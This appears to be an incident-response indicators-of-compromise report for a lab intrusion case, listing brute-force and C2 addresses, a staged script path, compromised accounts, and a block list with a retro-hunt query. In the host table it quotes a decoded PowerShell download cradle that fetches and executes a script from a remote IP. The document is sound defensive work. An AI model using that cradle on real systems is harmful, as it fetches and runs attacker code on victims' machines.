# Indicators of Compromise: INC-2024-0417

Indicators extracted during the investigation, with how each was validated and how I'd use
it. Lab values, the network indicators are placeholders chosen to represent
abuse-associated infrastructure; in a real case these would carry live reputation data.

## Network

| Indicator | Type | Role | Validation notes |
|---|---|---|---|
| `45.155.205.233` | IPv4 | Brute-force + RDP source | External hosting range with a scanning/brute-force history. In our own data: 214 failed RDP logons then the successful one. Confidence: high (behavior is self-evidencing). |
| `185.220.101.47` | IPv4 | Second-stage download + C2 | Range historically associated with Tor-exit / abuse infrastructure. In our data: port-80 download hit and a fixed-interval port-443 beacon. Confidence: high. |
| `cdn-telemetry[.]net` | Domain | C2 / beacon domain | Resolved to `185.220.101.47` at 02:53:20. Benign-sounding "CDN/telemetry" name is the masquerade. Confidence: high (resolution + beacon tie it to the C2 IP). |

## Host

| Indicator | Type | Role | Validation notes |
|---|---|---|---|
| `C:\Users\a.patel\AppData\Local\Temp\update.ps1` | File path | Staged payload | Written by `powershell.exe` at 02:52:55. `update.ps1` in a user Temp dir written by PowerShell is not a legitimate update mechanism. |
| `powershell.exe -nop -w hidden -enc <base64>` | Command line | Download cradle | Decodes to `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')`. Parent `explorer.exe`. |

## Identity

| Indicator | Type | Role | Notes |
|---|---|---|---|
| `CORP\a.patel` | Account | Compromised credential | Assume password burned; disable + reset. |
| `CORP\svc_backup` | Account | Brute-force target (not compromised) | Was sprayed but didn't fall; reset as precaution. |

## Validation philosophy

I validated behavior-first. Every indicator here earns its place from what it did *in our
own telemetry* the unsolicited external RDP, the download cradle, the fixed interval
beacon before any external reputation lookup. Threat intel reputation is corroboration,
not the basis of the verdict, so the case doesn't collapse if an enrichment source is down
or wrong. For an indicator I couldn't tie to local behavior, I'd mark it "observed, not
confirmed malicious" rather than promote it.

## Block / hunt list (for the SOC to action)

```
# Perimeter block
45.155.205.233
185.220.101.47

# DNS deny / sinkhole
cdn-telemetry.net

# Retro-hunt across the estate (have any other hosts talked to these?)
Event
| where Source == "Microsoft-Windows-Sysmon" and EventID in (3, 22)
| where EventData has "185.220.101.47" or EventData has "cdn-telemetry.net"
| parse EventData with * '<Data Name="Image">' Image '</Data>' *
| project TimeGenerated, Computer, Image, EventID
| order by TimeGenerated asc
```
